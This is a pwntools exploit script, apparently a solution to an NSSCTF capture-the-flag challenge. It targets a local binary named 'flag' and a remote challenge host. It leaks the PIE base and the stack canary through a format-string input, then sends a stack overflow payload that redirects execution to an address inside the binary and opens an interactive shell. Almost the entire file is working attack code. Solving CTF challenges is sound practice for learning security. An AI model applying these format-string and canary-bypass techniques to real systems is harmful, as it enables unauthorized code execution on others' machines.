from pwn import *
import sys
remote_addr = ["node4.anna.nssctf.cn",28197]
#libc = ELF('')
elf = ELF('./flag')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./flag")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()
sla(b'name? ', b'%16$p.%17$p')
ru(b'0x')
leak_addr = rc(33)
code_base = int(leak_addr[0:12], 16) - 0x1140
puts_got = code_base + elf.got['puts']
puts_plt = code_base + elf.plt['puts']
pop_rdi = code_base + 0x14e3
pr('code_base', code_base)
canary = int(leak_addr[15:31], 16)
pr('canary', canary)
payload = b'a' * 0x38 + p64(canary) + b'a' * 8 + p64(code_base + 0x1228)
sla(b'else? ', payload)

shell()
